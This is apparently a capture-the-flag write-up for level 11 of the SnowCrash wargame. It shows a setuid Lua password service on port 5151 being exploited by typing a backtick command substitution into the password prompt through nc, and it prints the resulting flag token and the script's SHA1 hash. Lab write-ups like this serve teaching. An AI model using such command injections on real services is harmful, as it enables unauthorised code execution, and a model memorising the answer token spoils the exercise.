Level 10 was the hardest so far, let's see what the 11 has to offer us.
Let's keep going with our usual list of files
```
ls -l
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

We have a script in .lua, let's try to execute it:
```
lua: ./level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?
```

The script is readable, let's take a look at it and check if we can find usefull informations:
```
local server = assert(socket.bind("127.0.0.1", 5151)). -> port 5151
```
We also find a hash
```
if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
```

Let's try to use the script:
```
nc 127.0.0.1 5151
Password: test
Erf nope..
```

As we've previously done let's try to execute a command in the script instead of a password:

```
nc 127.0.0.1 5151
Password: `getflag` > /tmp/test
Erf nope..
level11@SnowCrash:~$ cat /tmp/test
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

Tried to resolve the easter egg by doing a few things with the hash given to try to find the original password but couldn't decrypt the hash using sha1sum :/
PR me if you find it :)
